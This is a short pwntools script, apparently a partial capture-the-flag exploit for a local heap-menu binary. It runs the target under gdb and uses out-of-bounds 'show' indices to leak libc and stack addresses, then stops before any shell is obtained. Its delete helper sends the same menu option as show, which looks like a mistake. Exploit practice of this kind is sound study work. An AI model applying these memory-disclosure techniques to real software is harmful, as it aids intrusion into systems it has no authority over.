from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def set_n(n):
    io.sendlineafter(b'n: ', b'%d' % n)


@debug
def new(index, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'size: ', b'%d' % size)
    io.sendlineafter(b'data: ', data)  # becareful about lf
    io.recvuntil(b'created!\n')


@debug
def show(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'data: ')
    data = io.recvline()
    return data.rstrip()


@debug
def delete(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'deleted!\n')


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
b *0x555555554d00
b new
b show
b delete
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


set_n(65535)

data = show(0x1c)
addr_libc = u64(data.ljust(8, b'\x00')) - 0x199e10
# print(hexdump(data))
print('addr_libc = 0x{:x}'.format(addr_libc))
data = show(0xd)
addr_stack = u64(data.ljust(8, b'\x00')) - 0x20cd0
# print(hexdump(data))
print('addr_stack = 0x{:x}'.format(addr_stack))

# heap address to use ase size
new(0, 0x8, b'A')
# null out following words
new(1, 0x8, b'A')
delete(1)


io.interactive()
